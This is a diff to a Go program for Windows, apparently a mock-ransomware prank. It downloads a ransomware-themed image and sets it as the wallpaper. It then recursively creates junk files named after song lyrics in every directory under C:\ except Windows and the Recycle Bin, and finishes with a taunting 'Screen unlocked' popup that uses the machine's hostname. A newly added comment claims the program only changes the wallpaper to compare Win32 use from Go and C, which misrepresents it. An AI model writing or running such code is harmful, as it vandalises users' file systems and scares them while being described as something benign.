@@ -21,6 +21,8 @@ var (
 	procMessageBoxA           = user32DLL.NewProc("MessageBoxA")
 )
 
+// The program below changes the wallpaper of ze windows. It is designed to compare working with Win32 from Go and from C
+
 func changeWallpaper(imgURL string, img string) bool {
 	network.DownloadFile(imgURL)
 	rFile, err := os.Open(img)
@@ -81,31 +83,41 @@ func createRandomFiles(numberOfFiles int) {
 	}
 }
 
-func filesystemTraversal(root string, numberOfFiles int) {
+// func createRandomFilesRecursive(numberOfFiles int) {
+// 	i := 0
+// 	//Hardcoded the upper limit la2an ma ileh jledeh ishtighil data structures. It is 36 max
+// 	rickRoll := [50]string{"Never", "Gonna", "Give", "You", "Up", "Never", "Gonna", "Let", "You", "Down", "Never", "gonna", "run", "around", "and", "desert", "you", "Never", "gonna", "make", "you", "cry", "Never", "gonna", "say", "goodbye", "Never", "gonna", "tell", "a", "lie", "and", "hurt", "you"}
+// 	for i < numberOfFiles {
+// 		os.Create(rickRoll[i])
+// 		i++
+// 	}
+// }
+
+func filesystemTraversal(root string) { //Add backslashes to the dir otherwise go shits itself. Its not C:, it is C:\\
 	file, err := os.Open(root)
 	if err != nil {
-		return
+		return //panic(err) Replaced with return to see where we get (It does recursion just fine)
 	}
 	fileInfo, err := file.Stat()
 	if err != nil {
 		panic(err)
 	}
 	if fileInfo.IsDir() {
+		os.Chdir(root)
+		if root == "C:\\$Recycle.Bin\\" {
+			return
+		} // I dont want to pass into the recyvle bin directory
 		if root == "C:\\Windows\\" {
 			return
 		}
-		if root == "C:\\$Recyle.Bin\\" {
-			return
-		}
 		fmt.Println(root)
-		createRandomFiles(numberOfFiles)
 		entries, err := os.ReadDir(root)
 		if err != nil {
 			panic(err)
 		}
 		for _, e := range entries {
 			newRoot := root + e.Name() + "\\"
-			filesystemTraversal(newRoot, numberOfFiles)
+			filesystemTraversal(newRoot)
 		}
 
 	} else {
@@ -114,25 +126,73 @@ func filesystemTraversal(root string, numberOfFiles int) {
 	fmt.Println("Recursion Success")
 }
 
+func filesystemTraversalWrite(root string, numberOfFiles int) { //Add backslashes to the dir otherwise go shits itself. Its not C:, it is C:\\
+	file, err := os.Open(root)
+	if err != nil {
+		return //panic(err) Replaced with return to see where we get (It does recursion just fine)
+	}
+	fileInfo, err := file.Stat()
+	if err != nil {
+		panic(err)
+	}
+	if fileInfo.IsDir() {
+		os.Chdir(root)
+		if root == "C:\\$Recycle.Bin\\" {
+			return
+		} // I dont want to pass into the recyvle bin directory
+		if root == "C:\\Windows\\" {
+			return
+		}
+		fmt.Println(root)
+		i := 0
+		//Hardcoded the upper limit la2an ma ileh jledeh ishtighil data structures. It is 36 max
+		rickRoll := [50]string{"Never", "Gonna", "Give", "You", "Up", "Never", "Gonna", "Let", "You", "Down", "Never", "gonna", "run", "around", "and", "desert", "you", "Never", "gonna", "make", "you", "cry", "Never", "gonna", "say", "goodbye", "Never", "gonna", "tell", "a", "lie", "and", "hurt", "you"}
+		for i < numberOfFiles {
+			os.Create(rickRoll[i])
+			i++
+		}
+		entries, err := os.ReadDir(root)
+		if err != nil {
+			panic(err)
+		}
+		for _, e := range entries {
+			newRoot := root + e.Name() + "\\"
+			filesystemTraversalWrite(newRoot, numberOfFiles)
+		}
+
+	} else {
+		return
+	}
+	fmt.Println("Recursion Success")
+}
 func main() {
+	root := "C:\\"
 	numberOfRandomFiles := 30 //Dont go over 50
 	imgURL := "https://brightlineit.com/wp-content/uploads/2017/10/171013-How-to-Detect-and-Prevent-Ransomware-Attacks.jpg"
 	img := "171013-How-to-Detect-and-Prevent-Ransomware-Attacks.jpg"
 	Hostname, err := os.Hostname()
-	root := "C:\\"
 	if err != nil {
 		panic(err)
 	}
+	// test, err := os.ReadDir("C:\\Users")
+	// if err != nil {
+	// 	panic(err)
+	// }
+	// fmt.Println(test)
 
 	if changeWallpaper(imgURL, img) == false {
 		fmt.Println("Something went wrong !!! Wallpaper unchanged. Debug the program ...")
 		os.Exit(0)
 	}
+
+	//createRandomFiles(numberOfRandomFiles)
+	filesystemTraversalWrite(root, numberOfRandomFiles)
+
 	fmt.Println("Now calling Win32 to create a popup")
 	message := "Screen unlocked ya " + Hostname + "\x00" //Add the x00 or Windows loses it
 	title := "Yeah Yeah ... Bravoooo\x00"
 	createPopUp(title, message)
-	filesystemTraversal(root, numberOfRandomFiles)
+
 	// processList, err := process.GetProcesses()
 	// if err != nil {
 	// 	panic(err)
